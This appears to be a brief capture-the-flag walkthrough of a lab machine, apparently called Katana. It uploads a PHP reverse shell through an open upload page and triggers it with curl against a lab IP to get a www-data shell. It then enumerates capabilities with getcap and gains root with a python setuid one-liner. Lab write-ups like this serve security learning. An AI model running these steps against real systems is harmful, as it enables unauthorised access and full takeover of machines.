deep nmap shows ports 21, 22, 80, 7080 https, 8715 nginx, 8088 litespeed

ftp anon locked down
port 80 looked promising for a image upload for a bookstore, but the webpage wasnt supporting the edit feature

port 8088 is a static katana image
gobuster -x html on port 8088 shows an upload.html
There, we upload any file, and it is moved to 
"another server. at /opt/manager/html/katana_original_filename"
This would probably be equivalent to /var/www/html/filename, which is the webroot, and hence must be accessible from "other server's" port

```zsh
curl http://192.168.138.83:80/katana_php-reverse-shell.php
#not on the port 80 web server
curl https://192.168.138.83:7080/katana_php-reverse-shell.php  -k
#not on port 7080
curl http://192.168.138.83:8715/katana_php-reverse-shell.php
#we get the shell
```
www-data!

---
Nothing interesting initially
Then, when we look at the PATH var, we see the `.` is a member.
Which means any directory that is current to us, in in the path
ehh!

`getcap -r / 2>/dev/null`
`python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'`
root!